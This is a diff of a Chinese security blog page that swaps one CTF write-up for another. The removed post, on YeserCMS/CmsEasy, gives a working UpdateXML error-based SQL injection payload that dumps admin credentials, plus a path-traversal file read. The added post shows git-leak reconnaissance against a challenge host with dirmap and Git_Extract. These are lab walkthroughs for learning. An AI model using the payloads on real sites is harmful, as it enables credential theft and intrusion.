@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="百度杯9月份YeserCMS, Keep-Boom">
+    <meta name="keywords" content="i春秋-Hello World-git文件泄露, Keep-Boom">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>百度杯9月份YeserCMS | Keep-Boom</title>
+    <title>i春秋-Hello World-git文件泄露 | Keep-Boom</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">百度杯9月份YeserCMS</h1>
+                    <h1 class="description center-align post-title">i春秋-Hello World-git文件泄露</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-03-08
+                    2021-03-11
                 </div>
                 
 
@@ -459,21 +459,25 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="先对网站的CMS指纹进行识别"><a href="#先对网站的CMS指纹进行识别" class="headerlink" title="先对网站的CMS指纹进行识别"></a>先对网站的CMS指纹进行识别</h4><p><img src="/images/25.png"></p>
-<h4 id="然后百度搜索CmsEasy的历史漏洞。发现存在报错注入漏洞"><a href="#然后百度搜索CmsEasy的历史漏洞。发现存在报错注入漏洞" class="headerlink" title="然后百度搜索CmsEasy的历史漏洞。发现存在报错注入漏洞"></a>然后百度搜索CmsEasy的历史漏洞。发现存在报错注入漏洞</h4><p>url/celive/live/header.php</p>
-<p>POSTdata:</p>
-<pre><code>xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx&#39;,(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,&#39;|&#39;,password)) from cmseasy_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt;</code></pre>
-<h4 id="分析注入语句：利用的是updatexml报错注入"><a href="#分析注入语句：利用的是updatexml报错注入" class="headerlink" title="分析注入语句：利用的是updatexml报错注入"></a>分析注入语句：利用的是updatexml报错注入</h4><p>先查表</p>
-<pre><code>mid(select /**/group_concat(concat(table_name)) from information_schema.tables where table_schema=database()),1,32)</code></pre>
-<p>发现有十几个表，而yesercms_user这张表在最后，不知道大佬怎么遍历的。发现yesercms_user表里有username，password字段。查看数据。</p>
-<pre><code>mid(select /**/group_concat(concat(username,0x3a,password)) from yesercms_user,1,32)</code></pre>
-<p><img src="/images/26.png"></p>
-<p>用户名是admin，密码经过cmd5加密，不够全，修改1，32）范围，看后半段。</p>
-<p>解密后得密码为Yeser231</p>
-<h4 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h4><p>寻找可以上传文件的位置或可以让后台读取文件并回显的位置。（不过真的难找！我是没找到，找到个文件上传的位置发现考点不在那）</p>
-<p>在模板编辑那边随便选择一个编辑点击，用burp拦截下包，修改文件名。</p>
-<p>POST:</p>
-<p>&amp;id=#../../flag.php在response处就可以得到flag了。</p>
+                <p>f12发现有flag.xmas.js,访问404。再看cookie，解码发现是admin的rot13。然后没啥思路，看了wp，考的是敏感文件.git的泄露。</p>
+<h4 id="git泄露原因"><a href="#git泄露原因" class="headerlink" title="git泄露原因"></a>git泄露原因</h4><p>.git文件是开发人员在开发过程中使用Git做开发时产生的隐藏目录，该文件包含一些版本信息和网站源码，数据库信息等敏感信息。在运行git init 初始化代码库时，会在当前目录下产生一个.git的隐藏文件，用来记录代码的变更记录等。在发布代码的时候，没有把.git这个目录删除，导致可以使用这个文件来恢复源代码。</p>
+<h4 id="先用dirmap扫描网站"><a href="#先用dirmap扫描网站" class="headerlink" title="先用dirmap扫描网站"></a>先用dirmap扫描网站</h4><pre><code>cd dirmap
+python dirmap.py -i http://106.75.72.168:9999/ -lcf</code></pre>
+<p>结果：</p>
+<pre><code>[200][None][130.00b] http://106.75.72.168:9999/.git/config                        [200][None][650.00b] http://106.75.72.168:9999/.git/logs/HEAD                    [200][None][153.00b] http://106.75.72.168:9999/.git/logs/refs/heads/master        [200][None][41.00b] http://106.75.72.168:9999/.git/refs/heads/master              [200][None][73.00b] http://106.75.72.168:9999/.git/description                    [200][None][240.00b] http://106.75.72.168:9999/.git/info/exclude                  [200][None][33.00b] http://106.75.72.168:9999/.git/COMMIT_EDITMSG                [200][None][281.00b] http://106.75.72.168:9999/.git/index                        [200][None][23.00b] http://106.75.72.168:9999/.git/HEAD                          [200][text/html][100.00b] http://106.75.72.168:9999/index.php
+[200][text/html][100.00b] http://106.75.72.168:9999/index.php/login/</code></pre>
+<p>看到.git应该存在源码泄露。</p>
+<h4 id="然后用Git-Extract跑一下"><a href="#然后用Git-Extract跑一下" class="headerlink" title="然后用Git_Extract跑一下"></a>然后用Git_Extract跑一下</h4><pre><code>cd Git_Extract
+
+python git_extract.py &quot;http://106.75.72.168:9999/.git/&quot;</code></pre>
+<p>结果</p>
+<p><img src="/images/28.png"></p>
+<p>打开这两个文件发现很相近，用diff命令比较下</p>
+<pre><code>diff flag.js flag.js.04bb09</code></pre>
+<p><img src="/images/29.png"></p>
+<p>拼出来就是flag{}</p>
+<p>注：用GitHack扫不出flag.js.04bb09这个文件</p>
+<p>下载dirmap时需要先装下python3 的 pip</p>
 
             </div>
             <hr/>
@@ -499,7 +503,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/03/08/%E7%99%BE%E5%BA%A6%E6%9D%AF9%E6%9C%88%E4%BB%BDYeserCMS/">http://example.com/2021/03/08/%E7%99%BE%E5%BA%A6%E6%9D%AF9%E6%9C%88%E4%BB%BDYeserCMS/</a>
+                    <a href="http://example.com/2021/03/11/i%E6%98%A5%E7%A7%8B-Hello-World-git%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/">http://example.com/2021/03/11/i%E6%98%A5%E7%A7%8B-Hello-World-git%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -704,54 +708,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/03/09/SQL%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">
+                <a href="/2021/03/11/i%E6%98%A5%E7%A7%8B-Hello-World-git%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="SQL绕过姿势">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="i春秋-Hello World-git文件泄露">
                         
-                        <span class="card-title">SQL绕过姿势</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-03-09
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            Chan.Joy
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/03/06/i%E6%98%A5%E7%A7%8B-%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9C%E7%99%BE%E8%B6%8A%E6%9D%AF%E2%80%9C%E7%A6%8F%E5%BB%BA%E7%9C%81%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BDo-you-know-upload/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="i春秋-第三届“百越杯“福建省高校网络空间安全大赛Do you know upload">
-                        
-                        <span class="card-title">i春秋-第三届“百越杯“福建省高校网络空间安全大赛Do you know upload</span>
+                        <span class="card-title">i春秋-Hello World-git文件泄露</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -762,7 +730,45 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-06
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-11
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Chan.Joy
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/03/10/%E7%99%BE%E5%BA%A6%E6%9D%AF-code/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="百度杯-code">
+                        
+                        <span class="card-title">百度杯-code</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-10
                             </span>
                         <span class="publish-author">
                             
